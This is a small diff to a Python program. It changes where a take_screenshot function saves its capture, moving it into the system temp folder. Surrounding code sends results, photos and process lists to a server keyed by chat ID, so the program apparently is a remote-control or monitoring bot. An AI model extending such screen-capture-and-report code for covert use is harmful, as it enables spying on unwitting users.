@@ -903,8 +903,9 @@ def send_result(chat_id, text=None, photo_path=None, msg_id=None, proc_list=None
         print(f"[-] Error sending result to server: {e}")
 
 def take_screenshot():
-    screenshot_path = os.path.join(os.getcwd(), 'temp_screenshot.png')
-    
+    import tempfile
+    screenshot_path = os.path.join(tempfile.gettempdir(), 'rony_temp_screenshot.png')
+
     # 1. Primary Method: mss (highly reliable, supports all screens)
     try:
         import mss
